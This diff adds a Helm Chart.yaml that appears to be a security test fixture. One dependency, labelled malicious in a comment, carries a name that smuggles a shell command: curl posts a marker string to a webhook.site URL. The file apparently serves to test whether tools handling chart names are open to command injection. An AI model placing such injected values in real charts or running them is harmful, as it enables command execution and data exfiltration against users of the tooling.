@@ -1,0 +1,17 @@
+apiVersion: v2
+name: my-application
+description: A Helm chart for testing
+type: application
+version: 1.0.0
+appVersion: "1.0.0"
+
+dependencies:
+  # Legitimate dependency first
+  - name: nginx
+    version: "13.2.0"
+    repository: "https://charts.bitnami.com/bitnami"
+  
+  # Malicious dependency with injection in name
+  - name: redis"; curl -X POST -d "helm_name_injection" https://webhook.site/1c4a1cdb-8df1-4e8f-a051-83272a141999 #
+    version: "17.0.0"
+    repository: "https://charts.bitnami.com/bitnami"
